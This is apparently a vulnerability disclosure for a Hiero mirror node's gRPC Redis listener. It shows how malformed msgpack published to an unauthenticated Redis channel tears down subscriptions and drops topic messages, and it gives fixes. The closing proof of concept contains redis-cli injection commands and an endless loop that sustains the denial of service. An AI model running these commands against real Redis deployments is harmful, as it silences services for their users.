### Title
Malformed Msgpack Injection via Unauthenticated Redis Causes Sustained Transaction Gossip DoS via Retry Loop

### Summary
An attacker with write access to an unauthenticated Redis instance can publish a crafted malformed msgpack payload to any `topic.<id>` channel. `Jackson2JsonRedisSerializer` throws a `SerializationException` on deserialization, which terminates the reactive Flux and triggers the `retryWhen` backoff loop in `subscribe()`. During each backoff window the Redis subscription is torn down, causing all legitimate transaction gossip messages published in that window to be silently dropped. By continuously publishing malformed messages the attacker can maintain a near-permanent subscription gap for any targeted topic.

### Finding Description
**Exact code path:**

`grpc/src/main/java/org/hiero/mirror/grpc/listener/RedisTopicListener.java`, `subscribe()`, lines 68–79:

```java
private Flux<TopicMessage> subscribe(Topic topic) {
    Duration interval = listenerProperties.getInterval();

    return container
            .flatMapMany(r -> r.receive(Collections.singletonList(topic), channelSerializer, messageSerializer))
            .map(Message::getMessage)
            .doOnCancel(() -> unsubscribe(topic))
            .doOnComplete(() -> unsubscribe(topic))
            .doOnError(t -> log.error("Error listening for messages", t))   // only logs
            .doOnSubscribe(s -> log.info("Creating shared subscription to {}", topic))
            .retryWhen(Retry.backoff(Long.MAX_VALUE, interval).maxBackoff(interval.multipliedBy(4L)))
            .share();
}
```

**Root cause:** The `messageSerializer` is a `Jackson2JsonRedisSerializer` backed by a `MessagePackFactory` `ObjectMapper` with **no `StreamReadConstraints`** and no per-message error recovery operator (`onErrorContinue`/`onErrorResume`). [1](#0-0) 

When `r.receive(...)` deserializes a message, `Jackson2JsonRedisSerializer.deserialize()` is called. Any malformed msgpack byte sequence causes Jackson to throw a `JsonParseException`, which Spring wraps in a `SerializationException`. This propagates as a Reactor error signal through the Flux. [2](#0-1) 

The `doOnError` at line 76 only logs the error — it does not recover. The `retryWhen` at line 78 then re-subscribes after an exponential backoff (up to `interval × 4`). During this backoff window the `ReactiveRedisMessageListenerContainer` subscription is not active; any legitimate `TopicMessage` published by the importer's `RedisPublisher` during this window is permanently lost. [3](#0-2) 

The importer publishes to the same `topic.<id>` channels via `RedisPublisher.publish()`: [4](#0-3) 

There is no deduplication or replay mechanism — dropped pub/sub messages are gone.

**Why existing checks fail:** The `doOnError` callback (line 76) is a side-effect only; it does not swallow or skip the error. The `retryWhen` is designed for transient connection failures, not per-message deserialization errors, so every single malformed message causes a full subscription teardown and backoff cycle. The grpc `RedisConfiguration` does not apply `StreamReadConstraints` (unlike `rest-java` and `web3` which explicitly configure `maxDocumentLength`, `maxStringLength`, etc.). [5](#0-4) 

### Impact Explanation
Every crafted publish causes a subscription gap of at least `interval` milliseconds (up to `interval × 4` with backoff). All legitimate `TopicMessage` gossip for the targeted topic published during that window is dropped and never delivered to gRPC subscribers. An attacker who continuously publishes malformed messages (e.g., one per second) can keep the subscription in a perpetual retry loop, effectively silencing all real-time transaction gossip for any chosen topic. This directly undermines the mirror node's core function of delivering consensus topic messages to clients.

### Likelihood Explanation
Redis ships with authentication disabled by default (`requirepass ""`). Exposed Redis instances (port 6379) are extremely common in cloud deployments and are actively scanned by attackers. The attacker requires only TCP connectivity to the Redis port and the ability to issue a single `PUBLISH` command — no credentials, no application-layer access, no knowledge of internal state beyond the predictable channel name format `topic.<numeric_id>`. The attack is trivially repeatable with a simple loop and requires no special tooling beyond `redis-cli` or a raw TCP socket.

### Recommendation
1. **Per-message error recovery:** Replace the bare `retryWhen` with an `onErrorContinue` or wrap deserialization in a `flatMap` with `onErrorResume(e -> Mono.empty())` so a single bad message is skipped rather than terminating the entire subscription.
2. **Enforce Redis authentication:** Require `requirepass` / ACL configuration and pass credentials via Spring's `spring.data.redis.password`. The application should refuse to start without authentication configured.
3. **Apply `StreamReadConstraints` to the msgpack `ObjectMapper`:** Mirror the limits already present in `rest-java` and `web3` `JacksonConfiguration` to bound the cost of parsing any single message.
4. **Network-level isolation:** Redis should not be reachable from untrusted network segments; enforce firewall rules or use Redis in a private subnet.

### Proof of Concept
**Preconditions:** Redis is accessible without authentication on `redis-host:6379`. A gRPC client is subscribed to topic ID `1001`.

```bash
# Step 1: Confirm subscription is active (legitimate message delivered)
redis-cli -h redis-host PUBLISH topic.1001 "$(python3 -c "import msgpack; print(msgpack.packb({'@type':'TopicMessage','consensus_timestamp':1,'sequence_number':1,'topic_id':1001}))" | xxd -p)"

# Step 2: Inject a malformed msgpack payload
redis-cli -h redis-host PUBLISH topic.1001 $'\xff\xfe\xfd\x00\x01'

# Step 3: Observe in grpc service logs:
# ERROR Error listening for messages [SerializationException: ...]
# INFO  Creating shared subscription to topic.1001   <-- retry after backoff

# Step 4: During the backoff window, publish a legitimate message
redis-cli -h redis-host PUBLISH topic.1001 "<valid_msgpack_TopicMessage>"
# --> gRPC subscriber receives NOTHING (message dropped during backoff gap)

# Step 5: Loop to sustain the DoS
while true; do
  redis-cli -h redis-host PUBLISH topic.1001 $'\xff\xfe\xfd'
  sleep 0.5
done
# --> gRPC subscribers for topic 1001 receive zero legitimate messages indefinitely
```
